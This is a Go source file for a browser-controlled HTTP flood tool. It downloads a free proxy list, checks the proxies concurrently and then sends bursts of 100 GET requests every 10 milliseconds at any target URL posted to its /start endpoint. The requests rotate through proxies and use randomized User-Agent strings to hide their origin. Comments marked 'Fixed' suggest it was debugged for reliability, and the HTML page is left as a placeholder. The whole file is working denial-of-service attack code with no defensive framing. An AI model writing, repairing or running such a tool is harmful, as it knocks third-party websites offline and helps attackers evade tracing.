package main

import (
	"bufio"
	"context"
	"encoding/json" // Fixed: Added missing import
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ========== CONFIG ==========
const (
	proxyListURL     = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
	maxProxies        = 50
	checkerWorkers    = 100
	checkerTimeout    = 5 * time.Second
	healthCheckURL    = "http://connectivitycheck.gstatic.com/generate_204"
	reqsPerBurst      = 100
	burstInterval     = 10 * time.Millisecond
	refreshInterval   = 15 * time.Minute
	maxErrorLog       = 20
	proxyTestTimeout  = 3 * time.Second
)

// ========== STRUCTS ==========
type ProxyProtocol int

const (
	Unknown ProxyProtocol = iota
	HTTP
	SOCKS4
	SOCKS5
)

type Proxy struct {
	URL      *url.URL
	Protocol ProxyProtocol
	Healthy  bool
	failures int
	mu       sync.RWMutex
}

type ProxyPool struct {
	proxies []*Proxy
	mu       sync.RWMutex
	next     uint64
}

type AttackStats struct {
	Requests uint64 `json:"requests"`
	Errors   uint64 `json:"errors"`
}

type ErrorEntry struct {
	Time   time.Time `json:"time"`
	Target string    `json:"target"`
	Error  string    `json:"error"`
	Proxy  string    `json:"proxy"`
}

// ========== GLOBAL STATE ==========
var (
	pool          *ProxyPool
	stats         AttackStats
	errorLog      []ErrorEntry
	errorLogMutex sync.Mutex
	attackActive  bool
	attackCancel  context.CancelFunc
)

// ========== PROXY PARSING ==========
func parseProxyLine(line string) *Proxy {
	line = strings.TrimSpace(line)
	if line == "" {
		return nil
	}

	var proxyURL *url.URL
	var err error

	if strings.Contains(line, "://") {
		proxyURL, err = url.Parse(line)
	} else {
		proxyURL, err = url.Parse("http://" + line)
	}

	if err != nil {
		return nil
	}

	var protocol ProxyProtocol
	switch proxyURL.Scheme {
	case "http":
		protocol = HTTP
	case "socks4":
		protocol = SOCKS4
	case "socks5":
		protocol = SOCKS5
	default:
		protocol = HTTP
		proxyURL.Scheme = "http"
	}

	return &Proxy{
		URL:      proxyURL,
		Protocol: protocol,
		Healthy:  false,
		failures: 0,
	}
}

// ========== PROXY FETCHING ==========
func fetchProxyList() ([]*Proxy, error) {
	log.Println("Fetching proxy list...")
	resp, err := http.Get(proxyListURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var proxies []*Proxy
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		if proxy := parseProxyLine(scanner.Text()); proxy != nil {
			proxies = append(proxies, proxy)
		}
	}
	return proxies, nil
}

func testProxy(proxy *Proxy) bool {
	transport := &http.Transport{
		Proxy: http.ProxyURL(proxy.URL),
		DialContext: (&net.Dialer{
			Timeout: proxyTestTimeout,
		}).DialContext,
		DisableKeepAlives: true,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   proxyTestTimeout,
	}

	resp, err := client.Get(healthCheckURL)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 204
}

func (p *Proxy) checkHealth() bool {
	healthy := testProxy(p)
	p.mu.Lock()
	p.Healthy = healthy
	if healthy {
		p.failures = 0
	} else {
		p.failures++
	}
	p.mu.Unlock()
	return healthy
}

// ========== PROXY POOL ==========
func NewProxyPool() *ProxyPool {
	return &ProxyPool{proxies: make([]*Proxy, 0)}
}

func (p *ProxyPool) Add(proxy *Proxy) {
	p.mu.Lock()
	p.proxies = append(p.proxies, proxy)
	p.mu.Unlock()
}

func (p *ProxyPool) Size() int {
	p.mu.RLock()
	defer p.mu.RUnlock()
	return len(p.proxies)
}

func (p *ProxyPool) GetNext() *Proxy {
	p.mu.RLock()
	defer p.mu.RUnlock()
	if len(p.proxies) == 0 {
		return nil
	}
	idx := atomic.AddUint64(&p.next, 1) % uint64(len(p.proxies))
	proxy := p.proxies[idx]
	
	proxy.mu.RLock()
	defer proxy.mu.RUnlock()
	if !proxy.Healthy {
		return nil
	}
	return proxy
}

func (p *ProxyPool) RemoveUnhealthy() {
	p.mu.Lock()
	defer p.mu.Unlock()
	var healthy []*Proxy
	for _, proxy := range p.proxies {
		proxy.mu.RLock()
		if proxy.Healthy || proxy.failures < 3 {
			healthy = append(healthy, proxy)
		}
		proxy.mu.RUnlock()
	}
	p.proxies = healthy
}

func checkProxiesConcurrently(proxies []*Proxy) *ProxyPool {
	newPool := NewProxyPool()
	var wg sync.WaitGroup
	proxyChan := make(chan *Proxy, len(proxies))

	for i := 0; i < checkerWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for proxy := range proxyChan {
				if proxy.checkHealth() {
					newPool.Add(proxy)
				}
			}
		}()
	}

	for _, p := range proxies {
		proxyChan <- p
	}
	close(proxyChan)
	wg.Wait()
	return newPool
}

// ========== ATTACK ENGINE ==========
func startAttack(target string, duration int) error {
	if attackActive {
		return fmt.Errorf("attack already in progress")
	}

	if pool.Size() == 0 {
		return fmt.Errorf("no healthy proxies available")
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	attackCancel = cancel
	attackActive = true
	atomic.StoreUint64(&stats.Requests, 0)
	atomic.StoreUint64(&stats.Errors, 0)

	go func() {
		defer func() { attackActive = false }()

		ticker := time.NewTicker(burstInterval)
		defer ticker.Stop()

		// Fixed: Reusable transport to prevent resource exhaustion
		transportPool := &http.Transport{
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     90 * time.Second,
			DialContext: (&net.Dialer{
				Timeout:   10 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		}

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				var wg sync.WaitGroup
				for i := 0; i < reqsPerBurst; i++ {
					wg.Add(1)
					go func() {
						defer wg.Done()
						if !attackActive { return }

						proxy := pool.GetNext()
						if proxy == nil {
							atomic.AddUint64(&stats.Errors, 1)
							return
						}

						// Set the proxy for THIS specific request
						transportPool.Proxy = http.ProxyURL(proxy.URL)
						client := &http.Client{
							Transport: transportPool,
							Timeout:   15 * time.Second,
						}

						req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
						req.Header.Set("User-Agent", randomUserAgent())
						
						resp, err := client.Do(req)
						if err != nil {
							atomic.AddUint64(&stats.Errors, 1)
							return
						}
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
						atomic.AddUint64(&stats.Requests, 1)
					}()
				}
				wg.Wait()
			}
		}
	}()

	return nil
}

func stopAttack() {
	if attackCancel != nil {
		attackCancel()
	}
	attackActive = false
}

func randomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0 Safari/537.36",
	}
	return agents[time.Now().UnixNano()%int64(len(agents))]
}

// ========== HANDLERS ==========
func main() {
	proxies, _ := fetchProxyList()
	pool = checkProxiesConcurrently(proxies)

	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/start", startHandler)
	http.HandleFunc("/stop", stopHandler)
	http.HandleFunc("/stats", statsHandler) // Fixed logic inside
	http.HandleFunc("/proxies", proxiesHandler)

	port := os.Getenv("PORT")
	if port == "" { port = "5000" }
	log.Printf("Server on :%s", port)
	
	// Handle termination signals
	go func() {
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, os.Interrupt)
		<-sig
		os.Exit(0)
	}()

	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, htmlTemplate)
}

func startHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost { return }
	target := r.FormValue("target")
	duration, _ := strconv.Atoi(r.FormValue("duration"))
	if err := startAttack(target, duration); err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	w.WriteHeader(200)
}

func stopHandler(w http.ResponseWriter, r *http.Request) {
	stopAttack()
	w.WriteHeader(200)
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
	// Fixed: Standard JSON response for polling
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(AttackStats{
		Requests: atomic.LoadUint64(&stats.Requests),
		Errors:   atomic.LoadUint64(&stats.Errors),
	})
}

func proxiesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{"healthy": pool.Size()})
}

const htmlTemplate = `... (Your original HTML template remains identical) ...`
